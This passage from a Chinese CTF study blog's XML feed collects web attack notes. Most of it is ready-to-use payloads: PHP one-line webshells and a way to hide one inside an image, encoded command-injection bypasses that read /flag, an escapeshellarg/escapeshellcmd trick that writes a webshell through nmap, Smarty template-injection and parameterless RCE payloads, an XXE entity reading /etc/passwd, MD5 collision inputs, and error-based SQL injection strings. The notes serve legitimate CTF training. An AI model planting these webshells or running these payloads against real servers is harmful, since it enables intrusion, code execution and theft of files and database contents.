suctf.cc，很容易就构造出：file////:suctf.cc/usr/local/nginx/conf/nginx.conf，这样就能读取文件了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马执行</title>
      <link href="/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>正常：<br><?php@eval($_POST['x']);?></p><p>如果有&lt;?过滤，采用：</p><script language="php">eval($_REQUEST[x])</script><p>一种简单的绕安全狗方法：变量传递<br>&lt;?php<br>$a=$_GET[‘x’];<br>$$a=$_GET[‘y’];<br>$b($_POST[‘z’]);</p><p>传入方法：http://       php?x=b&amp;y=assert<br>post:           z=phpinfo();</p><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密<br><?php assert(base64_decode($_POST['x']));?><br>当这种情况用蚁剑连接时，需要采用base64加密。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单图片马的制作</title>
      <link href="/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
      <url>/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>1.首先图片命名111.jpg</p><p>2.再新建222.asp文件，一句话木马写入</p><p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p><p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传之后缀替换</title>
      <link href="/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>php2，php3、php4、php5，pht，phtml，phps</p><p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：<br>一、常见管道符：<br>‘|’ 直接执行后面的语句<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’ 前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>Linux:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同<br>二、空格绕过(空格被过滤)：<br>&lt;  –  重定向，如cat&lt;flag.php<br>&lt;&gt;      –   重定向，如cat&lt;&gt;flag.php<br>%09  –  需要php环境，如cat%09flag.php<br>${IFS}  –  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php<br>三、黑名单绕过<br>1、拼接<br>a=c;b=at;c=flag;$a$b $c<br>a=c;b=at;c=heb;d=ic;ab{c}{d}<br>2、base64编码<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag<br>3、hex编码<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag<br>4、单引号和双引号绕过<br>ca’’t flag 或ca””t flag<br>ca’’t te””st.php<br>5、反斜杠绕过<br>ca\t fl\ag<br>cat te\st.php<br>6、绕过ip中的句点<br>网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。<br>可以直接访问<a href="http://2130706433或者http//0x7F000001%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87.%E7%9A%84ip%E8%BF%87%E6%BB%A4%E3%80%82">http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。</a><br>在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP<br>四、绕过长度限制<br>1，通过&gt;来创建文件</p><blockquote><p>flag.txt<br>2，通过&gt;将命令结果存入文件中<br>echo “hello hacker” &gt; flag.txt<br>3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br>echo “hello hacker” &gt;&gt; flag.txt<br>4、Linux中命令换行<br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag<br>ca<br>t<br> fla<br>g.txt<br>将命令一条一条输入一个文本中再执行:<br>root@kali:<del># echo “ca\“&gt;cmd<br>root@kali:</del># echo “t\“&gt;&gt;cmd<br>root@kali:<del># echo “ fl\“&gt;&gt;cmd<br>root@kali:</del># echo “ag”&gt;&gt;cmd<br>root@kali:<del># cat cmd<br>ca<br>t<br> fl<br>ag<br>root@kali:</del># sh cmd<br>this is your flag<br>5、ls命令：<br>ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br>ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br>ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。”@”表示符号链接、”|”表示FIFOS、”/“表示目录、”=”表示套接字。<br>ls -s 在每个文件的后面打印出文件的大小。 size(大小)<br>ls -t 按时间进行文件的排序 Time(时间)<br>ls -A 列出除了”.”和”..”以外的文件。<br>ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br>ls -L 列出文件的链接名。Link（链接）<br>ls -S 以文件的大小进行排序<br>6、各种读文件命令：<br>cat–由第一行开始显示内容，并将所有内容输出<br>tac–从最后一行倒序显示内容，并将所有内容输出<br>more– 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head– 只显示头几行<br>tail –只显示最后几行<br>nl –类似于cat -n，显示时输出行号<br>tailf– 类似于tail -f<br>vim –使用vim工具打开文本<br>vi –使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 代码\命令执行类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>escapeshellarg+escapeshellcmd 函数漏洞</title>
      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p>这两个函数在一起用会有些问题.PS:先用escapeshellarg再用escapeshellcmd才会有这个问题<br>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>两次转译后出现了问题，没有考虑到单引号的问题</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p><p>总结当两个函数按这样顺序一起使用，使用过滤就没有意义了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti</title>
      <link href="/2021/10/08/ssti/"/>
      <url>/2021/10/08/ssti/</url>
      
        <content type="html"><![CDATA[<p>&#123;&#123; worldcount&#40;post.content&#41; &#125;&#125;</p><p>Flask使用Jinja2作为模板引擎<br>语法：<br>&#123;%…%&#125;语句(statements)<br>&#123;&#123;…&#125;&#125;打印模板输出的表达式(Expressions)<br>&#123;#…#&#125;注释<br>#…##行语句(Line Statements)</p><p>smarty注入payload</p><p>&#123;if phpinfo()&#125;&#123;/if&#125;<br>&#123;if system(‘ls’)&#125;&#123;/if&#125;<br>&#123; readfile(‘/flag’) &#125;<br>&#123;if show_source(‘/flag’)&#125;&#123;/if&#125;<br>&#123;if system(‘cat ../../../flag’)&#125;&#123;/if&#125; #本题payload</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 模板注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python的一些内置函数</title>
      <link href="/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>不过python还有一些内置函数，比如url_for和get_flashed_messages<br>/shrine/<br>    url_for(‘static’, filename=’style.css’)<br>    这个文件应该存储在文件系统上的 static/style.css 。<br>/shrine/  注意：globals两边是两个_<br>get_flashed<br>flask闪现：<br>Flask 提供了一个非常简单的方法来使用闪现系统向用户反馈信息。闪现系统使得在一个请求结束的时候记录一个信息，然后在且仅仅在下一个请求中访问这个数据，强调flask闪现是基于flask内置的session的，利用浏览器的session缓存闪现信息。所以必须设置secret_key。</p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D</a></p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B</a><br>%7Burl_for.<strong>globals</strong>%7D%7D</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap结合代码执行</title>
      <link href="/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/"/>
      <url>/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>-F 实行一次快速扫描<br>选项-oG<br>将结果Grep保存<br>nmap -F -oG test.txt 192.168.23.1<br>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘<br>传入的参数经过了escapeshellarg与escapeshellcmd两个函数的处理，导致在hack.php’这样的情况下会产生hack.php\,解决办法就是在单引号前加空格</p><p>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。<br>nmap -F -oA test 192.168.3.2</p><p>‘ -oN b.phtml <?=eval(\$_POST[a]);?>‘</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 代码\命令执行类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码执行,nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞脚本</title>
      <link href="/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>0x04 MD5碰撞脚本<br>授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。</p><pre><code># -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,. start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p><p>使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置</p><p>例如：python md5Crack.py “0e” 0</p><p>将产生MD5值为0e开头的字符串。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过手法</title>
      <link href="/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，<br>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b<br>这个字符串前几位刚好是 ‘ or ‘6，</p><p>md5(string,raw)</p><p>md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</p><p>0e绕过</p><pre><code>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</code></pre><p> 比如将两个md5值进行弱类型比较</p><p>md5(‘QNKCDZO’) == md5(240610708)</p><p>MD5加密后会变成这个样子</p><p>0e830400451993494058024219903391 == 0e462097431906509019562988736854</p><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p><p>0 == 0</p><p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020</p><p>强类型<br>(string)$_POST[‘a’]!==(string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’])===md5($_POST[‘b’])<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>收录一些MD5值相等的字符串</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>双md5结果仍为0e开头字符串大全</p><pre><code>MD5大全： CbDLytmyGm2xQyaLNhWn md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18 md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af 770hQgrBOjrcqftrlaZk md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625 md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064 7r4lGXCH2Ksu2JNT3BYM md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849 md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><p>md5(‘0e215962017’) ==&gt; “0e291242476940776845150308577824”</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数rec</title>
      <link href="/2021/10/08/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
      <url>/2021/10/08/%E6%97%A0%E5%8F%82%E6%95%B0rec/</url>
      
        <content type="html"><![CDATA[<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos() current() 的别名<br>current(localeconv())永远都是个点<br>readfile() 输出一个文件。<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>array_reverse()以相反的元素顺序返回数组。<br>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。<br>array_flip()交换数组的键和值<br>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p><p>如何读flag.php的源码<br>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()<br>view-source:<a href="http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()">http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()</a>))))));<br>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>?exp=show_source(session_id(session_start()));</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 代码\命令执行类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xml漏洞</title>
      <link href="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/xml%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><ul><li><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML被设计用来显示数据，其焦点是数据的外观。</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号。<br><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code>,为了避免错误。我们用实体引用<code>&amp;lt;</code>来代替”&lt;”字符。XML中，有5个预定义的实体引用。<br>&amp;lt &lt;<br>&amp;gt &gt;<br>&amp;amp &amp;<br>&amp;apos ‘<br>&amp;quot ‘<br>语法：<!-- --></p></li></ul><p>内部声明：<br>1</p><!DOCTYPE 根元素 [元素声明]><p>外部声明：<br>1</p><!DOCTYPE 根元素 SYSTEM "文件名"><p>XXE漏洞就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><p>xml实体：<br><?xml version="1.0" encoding="utf-8"?><br><!DOCTYPE note [  <!ENTITY admin SYSTEM "file:///etc/passwd"><br>  ]&gt;<br><user><username>&admin;</username><password>123456</password></user></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> xml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql常用注入手法</title>
      <link href="/2021/10/08/sql/"/>
      <url>/2021/10/08/sql/</url>
      
        <content type="html"><![CDATA[<p>MySQL 中的 RIGHT(s，n) 函数返回字符串 s 最右边的 n 个字符。可配合extractvalue进行完全显示<br>sql报错盲注：<br>union系列：<br>爆出数据库：<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>如果想一个一个显示，那么把group_concat去掉，再加上limit 0,1<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select schema_name from information_schema.schemata limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>爆出表:<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;</a> union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’security’  ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>updatexml:<br>payload:-1’and updatexml(1,concat(0x7e,database(),0x7e),1)%23 其中updatexml(1,concat(0x7e, ,0x7e),1),是基本格式，0x7e是十六进制的“~”，用来让查询到的东西更显眼。我们只需要在两个0x7e中间加入要查询的语句就可以了。<br>爆出当前数据库：<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and">http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and</a> updatexml(1,concat(0x7e,database(),0x7e),1)–+<br>updatexml（）这个函数最多只能爆32位字符，而我们要爆的数据超过了这个位数，所以我们一个一个的查，使用limit 0，1来实现。</p><p>^extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>同updatexml一样，限制长度也是32位。<br> se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误  。和updatexml语法一样注意参数不同就可以了。<br>！！！ select()   select 与()之间不要加空格</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27%5Eextractvalue(1,concat(0x7e,(select(database())),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</a></p><p>username=aaa&amp;password=aaa’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23<br>#语句主要用()绕过了空格，用like绕过了=号</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</a></p><p>select exp(<del>(select * FROM(SELECT USER())a)) //double 数值类<br>型超出范围<br>//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (exp(</del>(select * FROM(SELECT USER())a))),2, 3–+</p><p>select !(select * from (select user())x) -（ps:这是减号） <del>0<br>//bigint 超出范围；</del>0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</p><p><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (!(select * from (select user())x) - ~0),2,3-<br>-+</p><p>延时注入：<br><a 